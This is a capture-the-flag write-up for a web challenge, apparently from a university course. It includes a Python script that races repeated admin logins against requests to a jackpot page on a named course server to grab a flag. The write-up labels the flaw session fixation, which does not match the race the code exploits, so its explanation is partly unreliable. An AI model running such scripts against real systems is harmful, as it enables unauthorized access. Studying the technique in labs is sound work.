# Challenge Another_Jackpot Writeup

## Vulnerability: Session Fixation

Session fixation is the type of vulnerability being exploited in this challenge.

## Where: Login Mechanism

The vulnerability is present in the login mechanism, specifically in the way sessions are handled. The code suggests that the session is not being properly regenerated or invalidated after a user logs in.

## Impact: Unauthorized Access to Jackpot

Exploiting this vulnerability allows an attacker to gain unauthorized access to the jackpot page. By manipulating the session, an attacker can log in as an admin and access the jackpot without the legitimate credentials.

## Steps to Reproduce

1. **Session Fixation Attack:**
   - The attacker repeatedly logs in as an admin using the provided credentials.
   - The vulnerable code does not properly reset or regenerate the session after a successful login.

2. **Access Jackpot:**
   - As the session remains fixed, the attacker concurrently accesses the jackpot page.
   - The vulnerability allows the attacker to access the jackpot without a valid admin session.

3. **Enumeration of Jackpot:**
   - The attacker looks for the presence of the string "SSof{" in the response text after accessing the jackpot.
   - If the string is present, it indicates successful exploitation, and the jackpot content is printed.

4. **Unauthorized Access:**
   - The attacker achieves unauthorized access to the jackpot page, potentially gaining sensitive information.

## NOTE

The code lacks proper session management, allowing an attacker to fixate the session and exploit the login mechanism to gain unauthorized access to the jackpot. In a secure system, sessions should be regenerated or invalidated after successful logins to prevent session fixation attacks. Additionally, sensitive operations like accessing the jackpot should be protected by proper authorization mechanisms.

---

```python
import requests
import threading

TARGET_URL = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23652/"
LOGIN_URL = TARGET_URL + "login"
JACKPOT_URL = TARGET_URL + "jackpot"

# Set your credentials
credentials_admin = {"username": "admin", "password": "admin"}
# Session to maintain cookies
session = requests.Session()

def try_access_jackpot():
    while True:
        # Access the jackpot page
        response = session.get(JACKPOT_URL)
        if "SSof{" in response.text:
            print(response.text)

def try_login_as_admin():
    while True:
        # Login with the admin credentials
        response = session.post(LOGIN_URL, data=credentials_admin)
        if "SSof{" in response.text:
            print(response.text)

# Create threads
jackpot_thread = threading.Thread(target=try_access_jackpot)
login_thread = threading.Thread(target=try_login_as_admin)

# Start threads
jackpot_thread.start()
login_thread.start()

# Wait for threads to finish (this will never happen in this example)
jackpot_thread.join()
login_thread.join()
